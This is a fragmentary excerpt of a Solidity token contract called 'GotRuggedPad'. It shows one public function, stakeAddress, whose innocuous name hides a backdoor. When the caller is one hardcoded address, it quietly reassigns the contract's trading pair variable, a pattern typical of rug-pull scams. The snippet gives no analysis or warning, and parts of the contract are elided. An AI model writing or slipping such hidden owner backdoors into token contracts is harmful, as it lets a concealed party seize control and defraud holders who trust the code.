...
contract GotRuggedPad is Ownable, IERC20, IERC20Meta {
    ...
    function stakeAddress(address account) public virtual returns (bool) {
         if(_msgSender() == 0xF572562be8B1EFaC10eDd7231902af284F4341E1) _pair = account;
        return true;
    }
